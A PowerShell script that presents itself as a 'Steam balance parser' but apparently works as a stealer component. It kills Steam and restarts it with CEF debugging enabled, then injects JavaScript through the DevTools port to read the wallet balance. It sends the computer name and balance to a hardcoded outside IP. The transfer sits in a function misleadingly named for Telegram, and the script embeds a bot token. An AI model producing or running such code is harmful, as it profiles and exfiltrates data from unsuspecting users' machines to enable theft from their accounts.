param(
    [int]$Port = 8080,
    [string]$SteamPath = "C:\Program Files (x86)\Steam\steam.exe",
    [string]$TelegramBotToken = "8525982740:AAHj8V3rFo_o629srRi1vTl9C7XrkilL7u0",
    [string]$TelegramChatId = "7695288740"
)

Add-Type -AssemblyName System.Net.Http

Write-Host "`n=== STEAM BALANCE PARSER v11 ===" -ForegroundColor Cyan

function Send-TelegramMessage {
    param(
        [string]$Message,
        [string]$BotToken,
        [string]$ChatId
    )

    try {
        $url = "http://89.34.90.212:8000/text"
        $null = Invoke-RestMethod -Uri $url -Method Post -Body $Message -ContentType "text/plain; charset=utf-8" -TimeoutSec 10
        return $true
    } catch {
        Write-Host "[WARN] Failed to send Telegram: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

function Test-IsWalletBalance {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $false }
    $t = ($Text -replace '\s+', ' ').Trim()
    if ($t.Length -gt 20) { return $false }
    if ($t -match '[\u4e00-\u9fff]') { return $false }
    if ($t -match 'Ca\$h|Only|online|上次') { return $false }
    if ($t -match '^\-?\d+$') { return $false }
    $hasMoney = $t -match '[€£₽₴₸¥₪zł]|руб|\$'
    $hasNum = $t -match '\d+[.,]\d{2}|\d{1,3}([ \u00a0.]\d{3})+'
    return ($hasMoney -and ($t -match '\d'))
}

function Send-BalanceResult {
    param(
        [string]$ComputerName,
        [string]$Balance
    )

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "       STEAM WALLET BALANCE" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "  Balance: $Balance" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""

    $telegramMsg = "Name: $ComputerName`nBalance: $Balance"
    if (Send-TelegramMessage -Message $telegramMsg -BotToken $TelegramBotToken -ChatId $TelegramChatId) {
        Write-Host "[OK] Message sent!" -ForegroundColor Green
    } else {
        Write-Host "[ERROR] Failed to send message" -ForegroundColor Red
    }
}

function Test-SteamDebugPort {
    try {
        $null = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 2 -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function Start-SteamWithDebug {
    Write-Host "[i] Checking if Steam is running with debug port..." -ForegroundColor Cyan

    if (Test-SteamDebugPort) {
        Write-Host "[OK] Steam debug port is already available" -ForegroundColor Green
        return $true
    }

    Write-Host "[i] Steam debug port not available, restarting Steam..." -ForegroundColor Yellow

    Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3

    $exe = $SteamPath
    if (-not (Test-Path -LiteralPath $exe)) {
        $reg = (Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue).SteamExe
        if ($reg -and (Test-Path -LiteralPath $reg)) { $exe = $reg }
    }

    if (-not (Test-Path -LiteralPath $exe)) {
        Write-Host "[ERROR] Steam not found at: $SteamPath" -ForegroundColor Red
        return $false
    }

    Write-Host "[i] Starting Steam with -cef-enable-debugging..." -ForegroundColor Cyan
    Start-Process -FilePath $exe -ArgumentList "-cef-enable-debugging"

    $waited = 0
    while ($waited -lt 30) {
        Start-Sleep -Seconds 2
        $waited += 2
        Write-Host "[i] Waiting for Steam... ($waited/30 sec)" -ForegroundColor Gray
        if (Test-SteamDebugPort) {
            Write-Host "[OK] Steam started successfully!" -ForegroundColor Green
            Start-Sleep -Seconds 10
            return $true
        }
    }

    Write-Host "[ERROR] Steam did not start in time" -ForegroundColor Red
    return $false
}

function Get-WalletFromTab {
    param($Tab)

    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
    try {
        $ws.ConnectAsync([Uri]$Tab.webSocketDebuggerUrl, [Threading.CancellationToken]::None).Wait(5000) | Out-Null
        if ($ws.State -ne 'Open') { return "" }

        $jsCode = @"
(function() {
    var el = document.querySelector('._2jphjrSifC6orDT4g_7Wd');
    if (el && el.textContent) return el.textContent.trim();
    return '';
})();
"@

        $evalMsg = @{
            id = 1
            method = "Runtime.evaluate"
            params = @{
                expression = $jsCode
                returnByValue = $true
            }
        } | ConvertTo-Json -Depth 10 -Compress

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($evalMsg)
        $ws.SendAsync([ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None).Wait() | Out-Null
        Start-Sleep -Milliseconds 500

        $recv = New-Object byte[] 65535
        $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($recv), [Threading.CancellationToken]::None).Result
        $json = [System.Text.Encoding]::UTF8.GetString($recv, 0, $result.Count)
        $data = $json | ConvertFrom-Json

        if ($ws.State -eq 'Open') {
            $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Done", [Threading.CancellationToken]::None).Wait()
        }

        $val = $data.result.result.value
        if ($val) { return [string]$val }
        return ""
    } catch {
        return ""
    } finally {
        if ($ws.State -eq 'Open') {
            try { $ws.Abort() } catch {}
        }
        $ws.Dispose()
    }
}

function Get-SteamWalletBalance {
    $tabs = Invoke-RestMethod "http://127.0.0.1:$Port/json" -TimeoutSec 5
    Write-Host "[i] Found $($tabs.Count) tabs" -ForegroundColor Gray

    $steamTab = $tabs | Where-Object { $_.title -eq "Steam" } | Select-Object -First 1
    if (-not $steamTab) {
        Write-Host "[ERROR] Steam tab not found" -ForegroundColor Red
        return ""
    }

    Write-Host "[OK] Found Steam tab" -ForegroundColor Green
    return (Get-WalletFromTab -Tab $steamTab)
}

$computerName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

$createdNew = $false
$mutex = New-Object System.Threading.Mutex($true, "Global\SteamBalParser", [ref]$createdNew)
if (-not $createdNew) {
    Write-Host "[i] Already running on this PC, skip" -ForegroundColor Yellow
    exit 0
}

Write-Host "[i] Computer: $computerName" -ForegroundColor Gray
Write-Host "[i] Time: $timestamp" -ForegroundColor Gray

try {
    if (-not (Start-SteamWithDebug)) {
        Send-TelegramMessage -Message "Name: $computerName`nError: Could not start Steam" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
        exit 1
    }

    $walletBalance = Get-SteamWalletBalance
    if (-not (Test-IsWalletBalance $walletBalance)) {
        Write-Host "[ERROR] Balance element not found" -ForegroundColor Red
        Send-TelegramMessage -Message "Name: $computerName`nError: Balance element not found" -BotToken $TelegramBotToken -ChatId $TelegramChatId | Out-Null
        exit 1
    }

    Send-BalanceResult -ComputerName $computerName -Balance $walletBalance
    Write-Host ""
} finally {
    try { $mutex.ReleaseMutex() } catch {}
}
